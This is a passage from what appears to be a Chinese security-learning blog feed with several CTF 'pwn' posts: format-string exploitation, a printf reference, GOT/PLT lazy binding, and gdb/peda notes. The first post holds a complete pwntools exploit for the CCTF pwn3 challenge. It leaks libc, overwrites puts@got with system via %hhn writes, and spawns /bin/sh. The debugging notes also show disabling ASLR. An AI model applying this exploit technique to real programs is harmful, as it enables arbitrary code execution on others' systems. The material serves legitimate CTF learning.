<li>%s：输出的内容是字符串，即将偏移处指针指向的字符串输出，如%i$s表示输出偏移i处地址所指向的字符串，在32bit和64bit环境下一样，可用于读取GOT表等信息。</li>
<li>%n：将%n之前printf已经打印的字符个数赋值给偏移处指针所指向的地址位置，如%100x%10$n表示将0x64写入偏移10处保存的指针所指向的地址（4字节），而%$hn表示写入的地址空间为2字节，%$hhn表示写入的地址空间为1字节，%$lln表示写入的地址空间为8字节，在32bit和64bit环境下一样。有时，直接写4字节会导致程序崩溃或等候时间过长，可以通过%$hn或%$hhn来适时调整。</li>
<li>%n是通过格式化字符串漏洞改变程序流程的关键方式，而其他格式化字符串参数可用于读取信息或配合%n写数据</li>
</ul>
<font color="#f00">下面的结论是我最近的发现，是在调试逐渐加深理解的。printf(&quot;1234%n&quot;)：[偏移1]=4。也即修改的其实是栈上保存的地址中的值。如下图所示:</font>

<p><img src="/images/2017-08-04/printf_stack3.png" alt="printf_stack3.png"></p>
<p>格式化字符串漏洞发生在<strong>栈中</strong>，利用方式以下几种：</p>
<ol>
<li>修改变量的值，绕过认证</li>
<li>覆写GOT表</li>
<li>修改栈中保存的返回地址</li>
</ol>
<p>而之所以可以这样修改，全是因为字符串被保存在在了栈中。若格式化字符串<code>buf</code>存储在<strong>堆中</strong>，也就是说我们输入的内容不会出现在栈里，那就不能通过向栈中写入地址的方式进行攻击，不过可以利用栈中<strong>已有的值</strong>进行攻击。</p>
<h3 id="4-实验测试"><a href="#4-实验测试" class="headerlink" title="4. 实验测试"></a>4. 实验测试</h3><h4 id="4-1-CCTF-pwn3"><a href="#4-1-CCTF-pwn3" class="headerlink" title="4.1 CCTF-pwn3"></a>4.1 CCTF-pwn3</h4><p>本题只有NX一个安全措施，且为32位程序。</p>
<p>通过IDA逆向及初步调试，可以知道以下两点。</p>
<p>用户名是“sysbdmin”字符串中每个字母的ascii码减1，即rxraclhm；</p>
<p>在打印（即get功能，sub_080487F6函数）put（本程序功能，不是libc的puts）上去的文件内容时存在格式化字符串漏洞，且格式化字符串保存在栈中，偏移为7。</p>
<p>主要利用思路就是先通过格式化字符串漏洞泄露出libc版本，从而得到system函数调用地址；然后将该地址写到puts函数GOT表项中，由于程序dir功能会调用puts，且调用参数是用户可控的，故当我们以“/bin/sh”作为参数调用puts（也就是dir功能）时，其实就是以“/bin/sh”为参数调用system，也就实现了getshell。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div></pre></td><td class="code"><pre><div class="line"># -*- coding: utf-8 -*-</div><div class="line">#/usr/bin/env python</div><div class="line"></div><div class="line">from pwn import *</div><div class="line"></div><div class="line">elf = ELF(&apos;pwn3&apos;)</div><div class="line">libc = ELF(&apos;/lib32/libc.so.6&apos;)</div><div class="line">plt_puts = elf.symbols[&apos;puts&apos;]</div><div class="line">print &apos;plt_puts= &apos; + hex(plt_puts)</div><div class="line">got_puts = elf.got[&apos;puts&apos;]</div><div class="line">print &apos;got_puts= &apos; + hex(got_puts)</div><div class="line">p = process(&apos;./pwn3&apos;)</div><div class="line"></div><div class="line">username = &apos;rxraclhm&apos;</div><div class="line"></div><div class="line">def put(pr, name, content):</div><div class="line">    pr.recvuntil(&quot;ftp&gt;&quot;)</div><div class="line">    pr.sendline(&apos;put&apos;)</div><div class="line">    pr.recvuntil(&quot;upload:&quot;)</div><div class="line">    pr.sendline(name)</div><div class="line">    pr.recvuntil(&quot;content:&quot;)</div><div class="line">    pr.sendline(content)</div><div class="line"></div><div class="line">def get(pr, name, num):</div><div class="line">    pr.recvuntil(&quot;ftp&gt;&quot;)</div><div class="line">    pr.sendline(&apos;get&apos;)</div><div class="line">    pr.recvuntil(&apos;get:&apos;)</div><div class="line">    pr.sendline(name)</div><div class="line">    return pr.recvn(num)</div><div class="line"></div><div class="line">def dir(pr):</div><div class="line">    pr.recvuntil(&quot;ftp&gt;&quot;)</div><div class="line">    pr.sendline(&apos;dir&apos;)</div><div class="line"></div><div class="line">def edit_func(name, address, num):</div><div class="line">    num = num &amp; 0xff</div><div class="line">    if num == 0 : num == 0x100</div><div class="line">    payload = &apos;%&apos; + str(num) + &apos;c%10$hhn&apos;</div><div class="line">    payload = payload.ljust(12, &apos;A&apos;)</div><div class="line">    put(p, name, payload + p32(address))</div><div class="line">    get(p, name, 0)</div><div class="line"></div><div class="line">def main():</div><div class="line">    &apos;&apos;&apos;</div><div class="line">    gdb.attach(p, &quot;&quot;&quot;</div><div class="line">        B * 0x080488A4</div><div class="line">        &quot;&quot;&quot;)</div><div class="line">    &apos;&apos;&apos;</div><div class="line">    p.readuntil(&quot;Name (ftp.hacker.server:Rainism):&quot;)</div><div class="line">    p.sendline(username)</div><div class="line">    put(p, &quot;/sh&quot;, &quot;%8$s&quot;+p32(got_puts))</div><div class="line">    text = get(p, &quot;/sh&quot;, 4)</div><div class="line">    puts_addr = u32(text)</div><div class="line">    print &apos;puts_addr= &apos; + hex(puts_addr)</div><div class="line">    system_addr = puts_addr - (libc.symbols[&apos;puts&apos;] - libc.symbols[&apos;system&apos;])</div><div class="line">    print &apos;system_addr= &apos; + hex(system_addr)</div><div class="line"></div><div class="line">    edit_func(&apos;n&apos;, got_puts, system_addr)</div><div class="line">    edit_func(&apos;i&apos;, got_puts+1, system_addr&gt;&gt;8)</div><div class="line">    edit_func(&apos;b&apos;, got_puts+2, system_addr&gt;&gt;16)</div><div class="line">    edit_func(&apos;/&apos;, got_puts+3, system_addr&gt;&gt;24)</div><div class="line"></div><div class="line">    dir(p)</div><div class="line">    p.interactive()</div><div class="line">    pass</div><div class="line"></div><div class="line">if __name__ == &apos;__main__&apos;:</div><div class="line">    main()</div></pre></td></tr></table></figure>
<p>代码写的有点冗余，但主要的思路还是比较清晰：</p>
<blockquote>
<p>leak system_addr =&gt; write system_addr to puts@got =&gt; concat the /bin/sh =&gt; system(&#39;/bin/sh&#39;)</p>
</blockquote>
<p>题目算是没什么坑的fmt的题，个人觉得这些题还是有以下解题技巧：</p>
<p>1.函数封装的好，能够节省很多时间；</p>
<p>2.使用%10$x这样的形式确定参数的偏移，使用%10\$s这样的形式泄露特定地址数据，使用%c %n的组合拳来改写数据；</p>
<p>3.尽量使用%hn和%hhn，避免过多的返回；</p>
<p>4.最好在每次使用%n修改地址后，使用%s去确认一下修改是否成功，对于新手而言能节省大量的时间。</p>
]]></content>
      
        <categories>
            
            <category> pwn </category>
            
        </categories>
        
        
        <tags>
            
            <tag> c++ </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[printf格式化字符串]]></title>
      <url>/2017/08/04/printf%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/</url>
      <content type="html"><![CDATA[<h3 id="1-格式化字符串定义"><a href="#1-格式化字符串定义" class="headerlink" title="1. 格式化字符串定义"></a>1. 格式化字符串定义</h3><p><strong>格式化字符串</strong>，是一些程序设计语言在格式化输出API函数中用于指定输出参数的格式与相对位置的字符串参数，例如C、C++等程序设计语言的printf类函数，其中的转换说明（conversion specification）用于把随后对应的0个或多个函数参数转换为相应的格式输出；格式化字符串中转换说明以外的其它字符原样输出。</p>
<h3 id="2-POSIX标准下的printf函数"><a href="#2-POSIX标准下的printf函数" class="headerlink" title="2. POSIX标准下的printf函数"></a>2. POSIX标准下的printf函数</h3><h4 id="2-1-格式化占位符"><a href="#2-1-格式化占位符" class="headerlink" title="2.1 格式化占位符"></a>2.1 格式化占位符</h4><p>格式化字符串中的占位符用于指明输出的参数值如何格式化。</p>
<p>格式化占位符（format placeholder），语法是：</p>
<blockquote>
<p><strong>%[parameter][flags][field width][.precision][length]type</strong></p>
</blockquote>
<p><strong>Parameter</strong>可以忽略或者是：</p>
<table>
<thead>
<tr>
<th style="text-align:center">字符</th>
<th style="text-align:left">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">n$</td>
<td style="text-align:left"><strong><font color="#f00">n是用这个格式说明符（specifier）显示第几个参数</font></strong>；这使得参数可以输出多次，使用多个格式说明符，以不同的顺序输出。 如果任意一个占位符使用了parameter，则其他所有占位符必须也使用parameter。这是POSIX扩展，不属于ISO C。例：<br><code>printf(&quot;%2$d %2$#x; %1$d %1$#x&quot;,16,17) 产生&quot;17 0x11; 16 0x10&quot;</code></td>
</tr>
</tbody>
</table>
<p><strong>Flags</strong>可为0个或多个：</p>
<table>
<thead>
<tr>
<th>字符</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>+</td>
<td>总是表示有符号数值的&#39;+&#39;或&#39;-&#39;号，缺省情况是忽略正数的符号。仅适用于数值类型。</td>
</tr>
<tr>
<td>空格</td>
<td>使得有符号数的输出如果没有正负号或者输出0个字符，则前缀1个空格。如果空格与&#39;+&#39;同时出现，则空格说明符被忽略。</td>
</tr>
<tr>
<td>-</td>
<td>左对齐。缺省情况是右对齐。</td>
</tr>
<tr>
<td>#</td>
<td>对于&#39;g&#39;与&#39;G&#39;，不删除尾部0以表示精度。对于&#39;f&#39;, &#39;F&#39;, &#39;e&#39;, &#39;E&#39;, &#39;g&#39;, &#39;G&#39;, 总是输出小数点。对于&#39;o&#39;, &#39;x&#39;, &#39;X&#39;, 在非0数值前分别输出前缀0, 0x, and 0X表示数制。</td>
</tr>
<tr>
<td>0</td>
<td>如果width选项前缀以0，则在左侧用0填充直至达到宽度要求。例如printf(&quot;%2d&quot;, 3)输出&quot; 3&quot;，而printf(&quot;%02d&quot;, 3)输出&quot;03&quot;。如果0与-均出现，则0被忽略，即左对齐依然用空格填充。</td>
</tr>
</tbody>
</table>
<p><strong>Field Width</strong>给出显示数值的最小宽度，典型用于制表输出时填充固定宽度的表目。实际输出字符的个数不足域宽，则根据左对齐或右对齐进行填充。实际输出字符的个数超过域宽并不引起数值截断，而是显示全部。宽度值的前导0被解释为0填充标志，如上述；前导的负值被解释为其绝对值，负号解释为左对齐标志。如果域宽值为<code>*</code>，则由对应的函数参数的值为当前域宽。</p>
<p><strong>Precision</strong>通常指明输出的<em>最大</em>长度，依赖于特定的格式化类型。对于d、i、u、x、o的整型数值，是指最小数字位数，不足的位要在左侧补0，如果超过也不截断，缺省值为1。对于a,A,e,E,f,F的浮点数值，是指小数点右边显示的数字位数，必要时四舍五入；缺省值为6。对于g,G的浮点数值，是指有效数字的最大位数。对于s的字符串类型，是指输出的字节的上限，超出限制的其它字符将被截断。如果域宽为<code>*</code>，则由对应的函数参数的值为当前域宽。如果仅给出了小数点，则域宽为0。</p>
<p><strong>Length</strong>指出浮点型参数或整型参数的长度。此项Microsoft称为“Size”。可以忽略，或者是下述：</p>
<table>
<thead>
<tr>
<th>字符</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>hh</td>
<td>对于整数类型，printf期待一个从char提升的int尺寸的整型参数。</td>
</tr>
<tr>
<td>h</td>
<td>对于整数类型，printf期待一个从short提升的int尺寸的整型参数。</td>
</tr>
<tr>
<td>l</td>
<td>对于整数类型，printf期待一个long尺寸的整型参数。<br>对于浮点类型，printf期待一个double尺寸的整型参数。<br>对于字符串s类型，printf期待一个wchar_t指针参数。<br>对于字符c类型，printf期待一个wint_t型的参数。</td>
</tr>
<tr>
<td>ll</td>
<td>对于整数类型，printf期待一个long long尺寸的整型参数。Microsoft也可以使用I64</td>
</tr>
<tr>
<td>L</td>
<td>对于浮点类型，printf期待一个long double尺寸的整型参数。</td>
</tr>
<tr>
<td>z</td>
<td>对于整数类型，printf期待一个size_t尺寸的整型参数。</td>
</tr>
<tr>
<td>j</td>
<td>对于整数类型，printf期待一个intmax_t尺寸的整型参数。</td>
</tr>
<tr>
<td>t</td>
<td>对于整数类型，printf期待一个ptrdiff_t尺寸的整型参数。</td>
</tr>
</tbody>
</table>
<p>此外，在ISO C99广泛接受前，还有几个平台相关的length选项：</p>
<table>
<thead>
<tr>
<th>字符</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>I</td>
<td>对于有符号整数类型，printf期待一个ptrdiff_t尺寸的整型参数。对于无符号整数类型，printf期待一个size_t尺寸的整型参数。常见于Win32/Win64平台。</td>
</tr>
<tr>
<td>I32</td>
<td>对于整数类型，printf期待一个32位（双字）的整型参数。常见于Win32/Win64平台。</td>
</tr>
<tr>
<td>I64</td>
<td>对于整数类型，printf期待一个64位（四字）的整型参数。常见于Win32/Win64平台。</td>
</tr>
<tr>
<td>q</td>
<td>对于整数类型，printf期待一个64位（四字）的整型参数。常见于BSD平台。</td>
</tr>
</tbody>
</table>
<p>ISO C99的头文件<code>inttypes.h</code>包含了许多宏，用于平台独立的<code>printf</code>编码。例如：</p>
<h4 id="2-2-类型"><a href="#2-2-类型" class="headerlink" title="2.2 类型"></a>2.2 类型</h4><p><strong>Type</strong>，也称转换说明（conversion specification/specifier），可以是：</p>
<table>
<thead>
<tr>
<th>字符</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>d,i</td>
<td>有符号十进制数值int。&#39;%d&#39;与&#39;%i&#39;对于输出是同义；但对于scanf()输入二者不同，其中%i在输入值有前缀0x或0时，分别表示16进制或8进制的值。如果指定了精度，则输出的数字不足时在左侧补0。默认精度为1。精度为0且值为0，则输出为空。</td>
</tr>
<tr>
<td>u</td>
<td>十进制unsigned int。如果指定了精度，则输出的数字不足时在左侧补0。默认精度为1。精度为0且值为0，则输出为空。</td>
</tr>
<tr>
<td>f,F</td>
<td>double型输出10进制定点表示。&#39;f&#39;与&#39;F&#39;差异是表示无穷与NaN时，&#39;f&#39;输出&#39;inf&#39;, &#39;infinity&#39;与&#39;nan&#39;；&#39;F&#39;输出&#39;INF&#39;, &#39;INFINITY&#39;与&#39;NAN&#39;。小数点后的数字位数等于精度，最后一位数字四舍五入。精度默认为6。如果精度为0且没有#标记，则不出现小数点。小数点左侧至少一位数字。</td>
</tr>
<tr>
<td>e,E</td>
<td>double值，输出形式为10进制的([-]d.ddd e[+/-]ddd). E版本使用的指数符号为E（而不是e）。指数部分至少包含2位数字，如果值为0，则指数部分为00。Windows系统，指数部分至少为3位数字，例如1.5e002，也可用Microsoft版的运行时函数_set_output_format 修改。小数点前存在1位数字。小数点后的数字位数等于精度。精度默认为6。如果精度为0且没有#标记，则不出现小数点。</td>
</tr>
<tr>
<td>g,G</td>
<td>double型数值，精度定义为全部有效数字位数。当指数部分在闭区间 [-4,精度] 内，输出为定点形式；否则输出为指数浮点形式。&#39;g&#39;使用小写字母，&#39;G&#39;使用大写字母。小数点右侧的尾数0不被显示；显示小数点仅当输出的小数部分不为0。</td>
</tr>
<tr>
<td>x,X</td>
<td>16进制unsigned int。&#39;x&#39;使用小写字母；&#39;X&#39;使用大写字母。如果指定了精度，则输出的数字不足时在左侧补0。默认精度为1。精度为0且值为0，则输出为空。</td>
</tr>
<tr>
<td>o</td>
<td>8进制unsigned int。如果指定了精度，则输出的数字不足时在左侧补0。默认精度为1。精度为0且值为0，则输出为空。</td>
</tr>
<tr>
<td>s</td>
<td>如果没有用l标志，输出null结尾字符串直到精度规定的上限；如果没有指定精度，则输出所有字节。如果用了l标志，则对应函数参数指向wchar_t型的数组，输出时把每个宽字符转化为多字节字符，相当于调用wcrtomb函数。</td>
</tr>
<tr>
<td>c</td>
<td>如果没有用l标志，把int参数转为unsigned char型输出；如果用了l标志，把wint_t参数转为包含两个元素的wchart_t数组，其中第一个元素包含要输出的字符，第二个元素为null宽字符。</td>
</tr>
<tr>
<td>p</td>
<td>void *型</td>
</tr>
<tr>
<td>a,A</td>
<td>double型的16进制表示，&quot;[−]0xh.hhhh p±d&quot;。其中指数部分为10进制表示的形式。例如：1025.010输出为0x1.004000p+10。&#39;a&#39;使用小写字母，&#39;A&#39;使用大写字母。（C++11流使用hexfloat输出16进制浮点数）</td>
</tr>
<tr>
<td>n</td>
<td><font color="#f00">不输出字符，但是把已经成功输出的字符个数写入对应的整型指针参数所指的变量。</font></td>
</tr>
<tr>
<td>%</td>
<td>&#39;%&#39;字面值，不接受任何flags, width, precision or length。</td>
</tr>
</tbody>
</table>
<p>宽度与精度格式化参数可以忽略，或者直接指定，或者用星号&quot;<code>*</code>&quot;表示取对应函数参数的值。例如<code>printf(&quot;%*d&quot;, 5, 10)</code>输出&quot;<code>10</code>&quot;；<code>printf(&quot;%.*s&quot;, 3, &quot;abcdef&quot;)</code> 输出&quot;<code>abc</code>&quot;。</p>
<font color="#f000">如果函数参数太少，不能匹配所有的格式参数说明符，或者函数参数的类型不匹配，将导致未定义（undefined）行为。过多的函数参数被忽略。许多时候，未定义的行为将导致<a href="https://zh.wikipedia.org/w/index.php?title=%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%94%BB%E5%87%BB&amp;action=edit&amp;redlink=1" target="_blank" rel="external">格式化字符串攻击</a>。</font>

<p>某些编译器，如<a href="https://zh.wikipedia.org/wiki/GCC" target="_blank" rel="external">GCC</a>，会静态检查printf这一类函数的格式化参数并编译警告存在的问题（当使用编译标志<code>-Wall</code>或<code>-Wformat</code>）。GCC也会对用户自定义的printf风格函数做静态检查，如果在函数定义时使用了非标准的&quot;<code>format</code>&quot; <code>__attribute__</code>。</p>
<h3 id="3-printf函数的引申"><a href="#3-printf函数的引申" class="headerlink" title="3. printf函数的引申"></a>3. printf函数的引申</h3><p>其实不止printf函数可以格式化字符串，printf函数的变形也可以，例如printf_chk</p>
<p>printf_chk和printf不同的地方有两点：</p>
<ol>
<li>不能使用$n不连续的打印</li>
<li>在使用%n的时候会做一系列检查</li>
</ol>
]]></content>
      
        <categories>
            
            <category> pwn </category>
            
        </categories>
        
        
        <tags>
            
            <tag> c++ </tag>
            
            <tag> 信息泄露 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[got、plt表介绍]]></title>
      <url>/2017/08/03/got%E3%80%81plt%E8%A1%A8%E4%BB%8B%E7%BB%8D/</url>
      <content type="html"><![CDATA[<h3 id="1-GOT表和PLT表"><a href="#1-GOT表和PLT表" class="headerlink" title="1. GOT表和PLT表"></a>1. GOT表和PLT表</h3><p>GOT（Global Offset Table，全局偏移表）是Linux ELF文件中用于定位全局变量和函数的一个表。PLT（Procedure Linkage Table，过程链接表）是Linux ELF文件中用于延迟绑定的表，即函数第一次被调用的时候才进行绑定。</p>
<h3 id="2-延迟绑定"><a href="#2-延迟绑定" class="headerlink" title="2. 延迟绑定"></a>2. 延迟绑定</h3><p>所谓延迟绑定，就是当函数第一次被调用的时候才进行绑定（包括符号查找、重定位等），如果函数从来没有用到过就不进行绑定。基于延迟绑定可以大大加快程序的启动速度，特别有利于一些引用了大量函数的程序</p>
<h3 id="3-延迟绑定的基本原理"><a href="#3-延迟绑定的基本原理" class="headerlink" title="3. 延迟绑定的基本原理"></a>3. 延迟绑定的基本原理</h3><p>假如存在一个bar函数，这个函数在PLT中的条目为bar@plt，在GOT中的条目为bar@got，那么在第一次调用bar函数的时候，首先会跳转到PLT，伪代码如下：</p>
<p>bar@plt:</p>
<p>jmp bar@got</p>
<p>patch bar@got</p>
<p>这里会从PLT跳转到GOT，如果函数从来没有调用过，那么这时候GOT会跳转回PLT并调用patch bar@got，这一行代码的作用是将bar函数真正的地址填充到bar@got，然后跳转到bar函数真正的地址执行代码。当我们下次再调用bar函数的时候，执行路径就是先后跳转到bar@plt、bar@got、bar真正的地址。具体来看个实例：</p>
<p>vulnerable_function函数调用了read函数，由于read函数是动态链接加载进来的只有在链接的时候才知道地址，编译时并不知道地址</p>
<p><img src="/images/2017-08-03/1.png" alt="1"></p>
<p>执行call _read函数会跳到plt表中寻找中：</p>
<p><img src="/images/2017-08-03/2.png" alt="2"></p>
<p>plt表中会继续跳入到got表中寻找</p>
<p><img src="/images/2017-08-03/3.png" alt="3"></p>
<p>got表中的所存的read函数的地址便是在pwn6进程中的实际地址，也就是</p>
<p><img src="/images/2017-08-03/4.png" alt="4"></p>
]]></content>
      
        <categories>
            
            <category> pwn </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 调试 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[gdb的调试与使用]]></title>
      <url>/2017/08/03/gdb%E7%9A%84%E8%B0%83%E8%AF%95%E4%B8%8E%E4%BD%BF%E7%94%A8/</url>
      <content type="html"><![CDATA[<h3 id="1-调试的快捷键"><a href="#1-调试的快捷键" class="headerlink" title="1. 调试的快捷键"></a>1. 调试的快捷键</h3><font color="#f00">peda带有的功能，直接输入命令，其就会给予提示（如果不是这样，基本上也是该命令就可以不带参数）。这儿就不多做介绍</font>

<h4 id="1-1-基础的调试快捷键"><a href="#1-1-基础的调试快捷键" class="headerlink" title="1.1 基础的调试快捷键"></a>1.1 基础的调试快捷键</h4><ul>
<li>s step，si步入</li>
<li>n 执行下一条指令  ni步入</li>
<li>b 在某处下断点，可以用 <ul>
<li>b * adrress</li>
<li>b function_name</li>
<li>info b  查看断点信息</li>
<li>delete 1删除第一个断点</li>
</ul>
</li>
<li>c 继续</li>
<li>r 执行</li>
<li>disas addr 查看addr处前后的反汇编代码</li>
</ul>
<h4 id="1-2-显示数据"><a href="#1-2-显示数据" class="headerlink" title="1.2 显示数据"></a>1.2 显示数据</h4><ul>
<li>p 系列<ul>
<li>p system/main  显示某个函数地址<ul>
<li>p $esp    显示寄存器</li>
</ul>
</li>
<li>p/x  p/a p/b p/s。。。</li>
<li>p 0xff - 0xea   <font color="#f00">计算器</font></li>
<li>print &amp;VarName 查看变量地址</li>
<li>p * 0xffffebac   查看某个地址处的值</li>
</ul>
</li>
<li>x系列<ul>
<li>x/xw addr 显示某个地址处开始的16进制内容，如果有符号表会加载符号表</li>
<li>x/x $esp 查看esp寄存器中的值</li>
<li>x/s addr 查看addr处的字符串</li>
<li>x/b addr 查看addr处的字符</li>
<li>x/i  addr 查看addr处的反汇编结果</li>
</ul>
</li>
<li>info系列<ul>
<li>info register $ebp  查看寄存器ebp中的内容 (简写为 i r ebp)</li>
<li>i r eflags 查看状态寄存器</li>
<li>i r ss        查看段寄存器</li>
<li>i b            查看断点信息</li>
<li>i functions  查看所有的函数</li>
</ul>
</li>
<li>disas addr 查看addr处前后的反汇编代码</li>
<li>stack 20   查看栈内20个值</li>
<li>show args  查看参数</li>
<li>vmmap 查看映射状况 <font color="#f00">peda带有</font></li>
<li>readelf 查看elf文件中各个段的起始地址  <font color="#f00">peda带有</font></li>
<li>parseheap 显示堆状况  <font color="#f00">peda带有</font></li>
</ul>
<h4 id="1-3-查找数据"><a href="#1-3-查找数据" class="headerlink" title="1.3 查找数据"></a>1.3 查找数据</h4><ul>
<li>find 查找字符串    <font color="#f00">peda带有</font></li>
<li>searchmem 查找字符串  <font color="#f00">peda带有</font></li>
<li>ropsearch &quot;xor eax,eax;ret&quot;  0x08048080 0x08050000   查找某段的rop  <font color="#f00">peda带有</font></li>
<li>ropgadget  提供多个pop|ret可行结果  <font color="#f00">peda带有</font></li>
</ul>
<h4 id="1-4-修改数据"><a href="#1-4-修改数据" class="headerlink" title="1.4 修改数据"></a>1.4 修改数据</h4><ul>
<li>set $esp=0x110  修改寄存器的值</li>
<li>set *0xf7ff3234=0x08042334 修改内存的值</li>
<li>set args &quot;asdasg&quot; &quot;afdasgasg&quot; &quot;agasdsa&quot;  分别给参数1,2,3赋值</li>
<li>set args &quot;`python -c &#39;print &quot;1234\x7f\xde&quot;&#39;`&quot;    这个参数中用python脚本重写了一下，避免有些字符无法正确设置</li>
<li>r &quot;arg1&quot; &quot;arg2&quot; &quot;arg3&quot;   设置参数</li>
<li>run `$(perl -e &#39;print &quot;A&quot;x20&#39;)`</li>
</ul>
<h4 id="1-1-peda插件"><a href="#1-1-peda插件" class="headerlink" title="1.1 peda插件"></a>1.1 peda插件</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line">Enhance the display of gdb: colorize and display disassembly codes, registers, memory information during debugging.</div><div class="line">Add commands to support debugging and exploit development (for a full list of commands use peda help):</div><div class="line">aslr -- Show/set ASLR setting of GDB</div><div class="line">checksec -- Check for various security options of binary</div><div class="line">dumpargs -- Display arguments passed to a function when stopped at a call instruction</div><div class="line">dumprop -- Dump all ROP gadgets in specific memory range</div><div class="line">elfheader -- Get headers information from debugged ELF file</div><div class="line">elfsymbol -- Get non-debugging symbol information from an ELF file</div><div class="line">lookup -- Search for all addresses/references to addresses which belong to a memory range</div><div class="line">patch -- Patch memory start at an address with string/hexstring/int</div><div class="line">pattern -- Generate, search, or write a cyclic pattern to memory</div><div class="line">procinfo -- Display various info from /proc/pid/</div><div class="line">pshow -- Show various PEDA options and other settings</div><div class="line">pset -- Set various PEDA options and other settings</div><div class="line">readelf -- Get headers information from an ELF file</div><div class="line">ropgadget -- Get common ROP gadgets of binary or library</div><div class="line">ropsearch -- Search for ROP gadgets in memory</div><div class="line">searchmem|find -- Search for a pattern in memory; support regex search</div><div class="line">shellcode -- Generate or download common shellcodes.</div><div class="line">skeleton -- Generate python exploit code template</div><div class="line">vmmap -- Get virtual mapping address ranges of section(s) in debugged process</div><div class="line">xormem -- XOR a memory region with a key</div><div class="line">Installation</div></pre></td></tr></table></figure>
<p><strong>vmmap：查看当前程序映射的内存块</strong><br><strong>dumprop：</strong></p>
<h3 id="2-查找某个plt、got、plt-2"><a href="#2-查找某个plt、got、plt-2" class="headerlink" title="2. 查找某个plt、got、plt_2"></a>2. 查找某个plt、got、plt_2</h3><ul>
<li>plt 可以直接使用pwntools中的ELF(elf).symbols(function_name)</li>
<li>got 可以直接使用pwntools中的ELF(elf).got(function_name)</li>
<li>plt_2 可以直接使用pwntools中的ELF(lib).symbols(function_name)</li>
</ul>
<h3 id="3-查找程序所动态链接的库"><a href="#3-查找程序所动态链接的库" class="headerlink" title="3. 查找程序所动态链接的库"></a>3. 查找程序所动态链接的库</h3><ul>
<li><p>file pwn3</p>
<ul>
<li>pwn3: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=916959406d0c545f6971223c8e06bff1ed9ae74d, not stripped</li>
</ul>
</li>
<li><p>checksec pwn3</p>
<ul>
<li>[*] &#39;/root/Desktop/Pwnable/fmt/normal/fmt_string_write_got/pwn3&#39;<br>Arch:     i386-32-little<br>RELRO:    Partial RELRO<br>Stack:    No canary found<br>NX:       NX enabled<br>PIE:      No PIE (0x8048000)</li>
</ul>
</li>
</ul>
<ul>
<li>ldd pwn3<ul>
<li>linux-gate.so.1 (0xf77ad000)<br>libc.so.6 =&gt; /lib32/libc.so.6 (0xf75d2000)<br>/lib/ld-linux.so.2 (0x56601000)</li>
</ul>
</li>
</ul>
<h3 id="4-编译32位可执行文件"><a href="#4-编译32位可执行文件" class="headerlink" title="4. 编译32位可执行文件"></a>4. 编译32位可执行文件</h3><ul>
<li><p>gcc -m32 test.c -o test</p>
<ul>
<li>一般而言此时的目标文件为32位，且不能生成调试信息</li>
</ul>
</li>
<li><p>gcc -m32 -g test.c -o test</p>
<ul>
<li><p>生成的目标文件是32位，且可以利用操作系统的“原生格式（native format）”生成调试</p>
<p>信息。GDB 可以直接利用这个信息，其它调试器也可以使用这个调试信息</p>
</li>
</ul>
</li>
<li><p>其它保护状态的开启，请参考<a href="/2017/09/30/linux程序的常用保护机制/"><em>linux程序的常用保护机制</em></a></p>
</li>
</ul>
<h3 id="5-开启PIE之后的调试"><a href="#5-开启PIE之后的调试" class="headerlink" title="5. 开启PIE之后的调试"></a>5. 开启PIE之后的调试</h3><p>开启PIE之后，地址会一直在变，这十分不利于gdb的调试，所以这时候应该在本地关闭ASLR</p>
<p>常用的方法是：echo 0 &gt; /proc/sys/kernel/randomize_va_space</p>
<p>开启的方式是：echo 2 &gt; /proc/sys/kernel/randomize_va_space</p>
<h3 id="6-运行时查看文件执行"><a href="#6-运行时查看文件执行" class="headerlink" title="6. 运行时查看文件执行"></a>6. 运行时查看文件执行</h3><p>做了一道题，在你不执行的时候，只能找到相对地址，但是下断点需要实际的执行地址。若关闭PIE，那么每次的执行地址将会一致，这个时候就需要找到执行的开始地址。peda的常用指令中有vmmap，可以找到实际地址。</p>
